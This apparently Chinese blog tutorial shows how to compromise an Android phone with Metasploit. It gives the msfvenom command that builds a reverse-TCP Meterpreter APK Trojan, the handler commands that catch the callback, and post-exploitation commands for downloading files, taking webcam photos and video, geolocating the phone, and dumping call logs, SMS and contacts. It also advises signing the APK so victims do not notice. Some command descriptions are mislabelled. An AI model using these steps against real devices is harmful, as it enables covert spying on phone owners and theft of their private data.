{"title":"Metasploit之渗透安卓实战","date":"2018-11-17T14:19:50.000Z","thumbnail":"https://i.loli.net/2018/12/24/5c20d1463f471.jpg","slug":"Metasploit3","comments":true,"tags":["安卓渗透","远程木马攻击"],"categories":["Metasploit"],"updated":"2018-12-24T12:30:02.800Z","content":"<p>&nbsp;<br>&nbsp;</p>\n<h4 id=\"Metasploit之渗透安卓实战\"><font face=\"楷体\">Metasploit之渗透安卓实战</font><a href=\"post/Metasploit3#Metasploit之渗透安卓实战\"></a></h4><div class=\"article-bounded\"><div class=\"article-table\"><table><tr><td bgcolor=\"#D1EEEE\">&emsp;在之前的Metaspoloit使用中都是在Windows系统中，因为渗透的是Windows系统，所以选用了“windows/meterpreter/reverse_tcp”模块。<br>而这里需要渗透安卓系统了，就选用“android/meterpreter/reverse_tcp”模块。<br>那么对于kali-linux连接木马的方式还是和之前的一样，利用“exploit/multi/handler”<br>并且，同样需要选用“windows/meterpreter/reverse_tcp”的PAYLOAD<br>这里假设我的测试环境<br>kali-linux：  192.168.2.146<br>安卓模拟环境：192.168.2.107</td></tr></table></div></div>\n\n<p>&nbsp;</p>\n<h5 id=\"一、生成远程安卓木马\"><font face=\"楷体\">一、生成远程安卓木马</font><a href=\"post/Metasploit3#一、生成远程安卓木马\"></a></h5><div class=\"article-bounded\"><div class=\"article-table\"><table><tr><td bgcolor=\"#D1EEEE\"><font color=\"#dd0000\">msfconsole<br>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.2.146 LPORT=4444 R &gt; payload.apk</font></td></tr></table></div></div>\n\n<blockquote>\n<blockquote>\n<p>命令解析：<br>p 设置要使用的payload<br>LHOST 设置用来接收反弹连接的主机（kali-linux的IP）<br>LPORT 设置用来接收反弹连接的端口（kali-linux的端口）<br>R 设置文件格式<br>Location 要保存的文件位置–&gt;/root/Desktop/是桌面，没有目录表示当前系统Home目录下<br>PS：对于目前的安卓系统安全机制的考虑，因为没有签名证书可能导致无法安装或易被受害者识破<br>那么，签名证书的制作可以查看参考文献资料</p>\n</blockquote>\n</blockquote>\n<p>&nbsp;</p>\n<h5 id=\"二、开启metasploit，并且开启相关连接\"><font face=\"楷体\">二、开启metasploit，并且开启相关连接</font><a href=\"post/Metasploit3#二、开启metasploit，并且开启相关连接\"></a></h5><div class=\"article-bounded\"><div class=\"article-table\"><table><tr><td bgcolor=\"#D1EEEE\"><font color=\"#dd0000\">msfconsole<br>use exploit/multi/handler<br>set PAYLOAD android/meterpreter/reverse_tcp<br>set LHOST 192.168.2.146<br>set LPORT 4444<br>exploit</font></td></tr></table></div></div>\n\n<p>&nbsp;</p>\n<h5 id=\"三、meterpreter连接\"><font face=\"楷体\">三、meterpreter连接</font><a href=\"post/Metasploit3#三、meterpreter连接\"></a></h5><font face=\"楷体\">&emsp;安卓手机安装并且打开木马后会返回我们一个meterpreter连接,那么我们可以使用以下的一些常用的命令:</font>\n\n<div class=\"article-bounded\"><div class=\"article-table\"><table><tr><td bgcolor=\"#D1EEEE\"><font color=\"#dd0000\">cd               –&gt;目录切换，命令：cd /  切换到根目录<br>search           –&gt;搜索文件，命令：search text.jpg<br>download         –&gt;下载文件，命令：download test.jpg<br>webcam_list      –&gt;查看摄像头列表，因为手机都是前置和后置摄像头了<br>webcam_snap      –&gt;拍照一张，需要选用前置或者后置摄像头，命令：webcam_snap -i 1<br>webcam_stream    –&gt;开启摄像头视频监控，同上，命令：webcam_stream -i 1</font><br><font color=\"#dd0000\">安卓系统相关命令：<br>check_root       –&gt;查看当前安卓是否已经root<br>dump_calllog     –&gt;下载通话记录<br>dump_contacts    –&gt;下载短信记录<br>dump_sms         –&gt;下载通讯录<br>geolocate        –&gt;利用谷歌地图定位（需要安装谷歌地图）</font></td></tr></table></div></div>\n\n<p>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;</p>\n","prev":{"title":"薛之谦-《怪咖》专辑","slug":"薛之谦-《怪咖》专辑"},"next":{"title":"Metasploit工具Meterpreter的命令速查表","slug":"Metasploit2"},"link":"Treecatee.gitgub.io/post/Metasploit3/","copyright":{"author":"Treecatee","link":"<a href=\"Treecatee.gitgub.io/post/Metasploit3/\" title=\"Metasploit之渗透安卓实战\">Treecatee.gitgub.io/post/Metasploit3/</a>","license":"Attribution-NonCommercial-NoDerivatives 4.0 International (<a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/\" rel=\"external nofollow noopener\" target=\"_blank\">CC BY-NC-ND 4.0</a>)"}}